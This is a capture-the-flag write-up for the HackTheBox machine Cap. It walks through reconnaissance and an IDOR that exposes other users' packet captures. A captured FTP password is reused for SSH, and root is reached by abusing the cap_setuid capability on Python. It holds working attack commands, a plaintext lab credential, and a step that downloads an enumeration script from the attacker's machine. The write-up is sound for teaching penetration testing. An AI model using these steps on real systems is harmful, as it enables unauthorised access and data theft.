---
title: HTB: Cap
url: https://0xdf.gitlab.io/2021/10/02/htb-cap.html
date: 2021-10-02T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-cap, hackthebox, ctf, nmap, pcap, idor, feroxbuster, wireshark, credentials, capabilities, linpeas
---

![Cap](https://0xdfimages.gitlab.io/img/cap-cover.png)

Cap provided a chance to exploit two simple yet interesting capabilities. First, there’s a website with an insecure direct object reference (IDOR) vulnerability, where the site will collect a PCAP for me, but I can also access other user’s PCAPs, to include one from the user of the box with their FTP credentials, which also provides SSH access as that user. With a shell, I’ll find that in order for the site to collect pcaps, it needs some privileges, which are provided via Linux capabilities, including one that I’ll abuse to get a shell as root.

## Box Info

| Name | [Cap](https://hackthebox.com/machines/cap)  [Cap](https://hackthebox.com/machines/cap) [Play on HackTheBox](https://hackthebox.com/machines/cap) |
| --- | --- |
| Release Date | [05 Jun 2021](https://twitter.com/hackthebox_eu/status/1400100165411905536) |
| Retire Date | 02 Oct 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Cap |
| Radar Graph | Radar chart for Cap |
| First Blood User | 00:03:38[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:04:44[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.245
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 06:50 EDT
Nmap scan report for 10.10.10.245
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds

oxdf@parrot$ nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.245       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 06:51 EDT
Nmap scan report for 10.10.10.245
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn                              
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND                                    
|     Server: gunicorn                                                 
|     Date: Sat, 22 May 2021 10:51:48 GMT
|     Connection: close                                                
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>                                             
|     <h1>Not Found</h1>               
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>                         
|   GetRequest:                        
|     HTTP/1.0 200 OK                  
|     Server: gunicorn                 
|     Date: Sat, 22 May 2021 10:51:42 GMT                                      
|     Connection: close                
|     Content-Type: text/html; charset=utf-8                                   
|     Content-Length: 19386                                                    
|     <!DOCTYPE html>                  
|     <html class="no-js" lang="en">                                           
|     <head>
...[snip]...
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.13 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Focal 20.04.

`nmap` didn’t call out anonymous FTP access, and I confirmed that manually as well.

### Website - TCP 80

#### Site

The website is a security dashboard:

![image-20210522070007349](https://0xdfimages.gitlab.io/img/image-20210522070007349.png)

There’s a user named Nathan logged in, and the links in the drop down menu under that aren’t active:

![image-20210522070048715](https://0xdfimages.gitlab.io/img/image-20210522070048715.png)

The menu on the left does expand and offers three additional pages in addition to the dashboard.

Security Snapshot (`/capture`) hangs for 5 seconds, and then redirects to `/data/5` where it returns a list of packets:

![image-20210522070209222](https://0xdfimages.gitlab.io/img/image-20210522070209222.png)

If I visit `/capture` again (this time while running `feroxbuster`), now it’s at `/data/7` (and there are actual packets):

![image-20210522070338508](https://0xdfimages.gitlab.io/img/image-20210522070338508.png)

The download button links to `/download/7`, and will download an actual PCAP file:

![image-20210522070359072](https://0xdfimages.gitlab.io/img/image-20210522070359072.png)

The numbers on those downloads seem to increase each time and be globally shared across all users.

Looking in Wireshark, all the packets are between my IP and Cap. I had already started my directory brute force, and that’s what’s reflected in the PCAP, so it looks like a live capture.

IP Config (`/ip`) looks to print the results of `ifconfig`:

![image-20210522070611604](https://0xdfimages.gitlab.io/img/image-20210522070611604.png)

Network Status (`/netstat`) does the same with `netstat`:

[![image-20210522070656698](https://0xdfimages.gitlab.io/img/image-20210522070656698.png)](https://0xdfimages.gitlab.io/img/image-20210522070656698.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210522070656698.png)

#### Directory Brute Force

I’ll run [FeroxBuster](https://github.com/epi052/feroxbuster) against the site with no extensions since it’s using Python:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.245

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.245
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      355l     1055w    17447c http://10.10.10.245/ip
302        4l       24w      220c http://10.10.10.245/capture
302        4l       24w      208c http://10.10.10.245/data
[####################] - 2m     29999/29999   0s      found:3       errors:0      
[####################] - 1m     29999/29999   250/s   http://10.10.10.245

```

Nothing new here.

## Shell as nathan

### IDOR

An [Insecure Direct Object Reference](https://portswigger.net/web-security/access-control/idor) (IDOR) is a vulnerability there an attacker can manipulate a url or parameter to a request to access objects that they were not intended to access. These bugs seem trivial, but are all over the place (like [US Department of Defense](https://www.zdnet.com/article/bug-hunter-wins-researcher-of-the-month-award-for-dod-account-takeover-bug/), [political party websites](https://grahamcluley.com/alex-salmonds-alba-party-website-leaks-data-in-idor-foul-up/), [ZenDesk](https://www.bleepingcomputer.com/news/security/typeform-fixes-zendesk-sell-form-data-hijacking-vulnerability/), and [Parler](https://www.wired.com/story/parler-hack-data-public-posts-images-video/)).

In this case, I have a link to `/download/7`. But if I start to step back, I can find other PCAPs.

I’ll exploit this with a quick loop to get everything. If I notice that that number seems to one up, I’ll download until it fails, and then break, with the following loop:

```

for i in {0..500}; do 
  wget 10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; 
done;

```

I’ll loop over `i` from 0 to a large number I don’t expect to reach. For each, I’ll use `wget` to download and save the pcap in a folder. I’ll use `2>/dev/null` to hide the `wget` output. `|| break` will check the return code from `wget`, and if it fails, it will exit the loop. This loop does assume no gaps, as the first time it fails to get a PCAP, it will break out of the loop. I could try a more forgiving loop if this one doesn’t find what I need.

This is also a good place to think about the scope of whatever you’re working on. As this is HTB, I’ll grab as much as I can. If this were a real world target I was working for a bug bounty, I’d want to be really careful about the scope, and maybe only grab a couple bits of other’s data to limit the amount of PII or other sensitive data I collected.

I’ll add a `rm` at the end to remove the last failed download attempt. It works:

```

oxdf@parrot$ for i in {0..500} ; do wget 10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done; rm pcaps/${i}.pcap
oxdf@parrot$ ls pcaps/
0.pcap  1.pcap  2.pcap  3.pcap  4.pcap  5.pcap  6.pcap  7.pcap  8.pcap  9.pcap

```

### PCAP Analysis

In `0.pcap`, there are a few TCP streams. One is a GET request for what looks like a PCAP analyzer site. The next two are the CSS and Favicon for that site.

Then there’s an FTP session containing a password for nathan (the same username as the website):

![image-20210523112832362](https://0xdfimages.gitlab.io/img/image-20210523112832362.png)

### FTP

The password “Buck3tH4TF0RM3!” works to connect to FTP on Cap as nathan:

```

oxdf@parrot$ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:oxdf): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

`dir` shows only one file I can access:

```

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 May 15 21:40 user.txt
226 Directory send OK

```

`ls -la` actually shows the FTP root is in what looks like a home directory:

```

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27 09:16 .
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -> /dev/null
-r--------    1 1001     1001           33 Oct 02 07:24 user.txt
226 Directory send OK.

```

I can grab `user.txt`, completing the user half of the box:

```

ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (13.8848 kB/s)
ftp> 
221 Goodbye.
oxdf@parrot$ cat user.txt
b610b8fa************************

```

### SSH

The same password works for SSH as nathan as well:

```

oxdf@parrot$ sshpass -p 'Buck3tH4TF0RM3!' ssh nathan@10.10.10.245
...[snip]...
nathan@cap:~$

```

## Shell as root

### Enumeration

#### Source Analysis

With not much in the user’s home directory and no other users, I’ll turn back to looking at the webapp. It’s a flask app with a handful of routes. It defines a variable at the top, `pcapid = 0`, that is used globally to store new pcaps. The `/capture` route was interesting:

```

@app.route("/capture")
@limiter.limit("1 per minute")
def capture():
        os.setuid(0)

        get_lock()
        pcapid = get_appid()
        increment_appid()
        release_lock()

        path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
        ip = request.remote_addr
        command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
        os.system(command)

        os.setuid(1000)
        return redirect("/data/" + str(pcapid))

```

It is using `os.system` to call `tcpdump` with a five second timeout and save it in the `upload` directory with the current `pcapid` and the `.pcap` extension. Any time I see Python calling `os.system`, my first thought is to look for command injections. But the command passed to `system` doesn’t contain any user supplied variables, so that’s out.

Still, to call `tcpdump` like that, the user must be root, or have certain capabilities. The Python is calling `os.seduid(0)` at the start of the function. That will effectively make it root.

Not any application can call `setuid(0)`. It must be a privileged process. But the web process is running as nathan:

```

nathan     23827  0.0  1.0  26736 21528 ?        Ss   May22   0:11 /usr/bin/python3 /usr/local/bin/gunicorn app:app -b 0.0.0.0:80
nathan     87830  0.0  1.7 115920 34128 ?        S    15:08   0:00 /usr/bin/python3 /usr/local/bin/gunicorn app:app -b 0.0.0.0:80

```

Nothing interesting about the permissions on `app.py`:

```

nathan@cap:/var/www/html$ ls -l app.py 
-rw-r--r-- 1 nathan nathan 4088 May 23 16:20 app.py

```

Or on Python:

```

nathan@cap:/var/www/html$ ls -l /usr/bin/python3
lrwxrwxrwx 1 root root 9 Mar 13  2020 /usr/bin/python3 -> python3.8
nathan@cap:/var/www/html$ ls -l /usr/bin/python3.8
-rwxr-xr-x 1 root root 5486384 Jan 27 15:41 /usr/bin/python3.8

```

One way to give a program some privileges without having it completely get the power of root is to use [Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html). `Python` has been assigned two:

```

nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

#### LinPEAS

If I didn’t see the issues in the web code, a script like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) would also identify the capabilities. I’ll clone a copy of [PEASS-ng](https://github.com/carlospolop/PEASS-ng) to my VM, and start a Python webserver in the directory with `linpeas.sh`:

```

oxdf@parrot$ cd /opt/PEASS-ng/linPEAS/
oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

I’ll request it with `wget`:

```

nathan@cap:/tmp$ wget 10.10.14.5/linpeas.sh                                                                                             
--2021-10-02 10:33:19--  http://10.10.14.5/linpeas.sh                                                                                   
Connecting to 10.10.14.5:80... connected.                                                                                               
HTTP request sent, awaiting response... 200 OK
Length: 470149 (459K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                        100%[=============================================================>] 459.13K  1.79MB/s    in 0.3s    

2021-10-02 10:33:19 (1.79 MB/s) - ‘linpeas.sh’ saved [470149/470149]

```

And run it with `bash linpeas.sh`. The section on capabilities has `python3.8` highlighted to the max:

![image-20211002063515904](https://0xdfimages.gitlab.io/img/image-20211002063515904.png)

### Shell

#### Capabilities Background

The man page describes `cap_net_bind_service` as:

> ```

> Bind a socket to Internet domain privileged ports (port
> numbers less than 1024).
>
> ```

This is a really useful capability because it allows this one action without giving full root. In fact, I’ve set this capability on `python` on my VM so I don’t have to run `sudo` every time I want to start a Python webserver.

The man page describes `cap_setuid` as:

> ```

> * Make arbitrary manipulations of process UIDs (setuid(2),
> setreuid(2), setresuid(2), setfsuid(2));
> * forge UID when passing socket credentials via UNIX
> domain sockets;
> * write a user ID mapping in a user namespace (see
> user_namespaces(7)).
>
> ```

`cap_seduid` has some good uses on binaries, but on something like Python which can take arbitrary user input, it is dangerous.

#### Abusing Capabilities

I’ll abuse the `cap_setuid` to change the user id of the current process to something else, like I observed above. If this capabilities just applied to the webserver, there would be no issue. But I can also open a Python terminal:

```

nathan@cap:/var/www/html$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>

```

I can use a familiar line to get a shell:

```

>>> import pty
>>> pty.spawn("bash")
nathan@cap:/var/www/html$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

```

That’s as expected. I’ll exit:

```

nathan@cap:/var/www/html$ exit
0
>>>

```

Back at the Python prompt, I’ll set the userid for this process to root:

```

>>> import os
>>> os.setuid(0)

```

I can try to set the group id, but I don’t have that permission:

```

>>> os.setgid(0)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted

```

There is a `cap_setgid` capability as well that was not set here.

Now using `pty` to get a shell again gives a shell as the root user:

```

>>> pty.spawn("bash")
root@cap:/var/www/html# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

```

From there I can grab `root.txt`:

```

root@cap:/var/www/html# cd /root/
root@cap:/root# cat root.txt
f766c793************************

```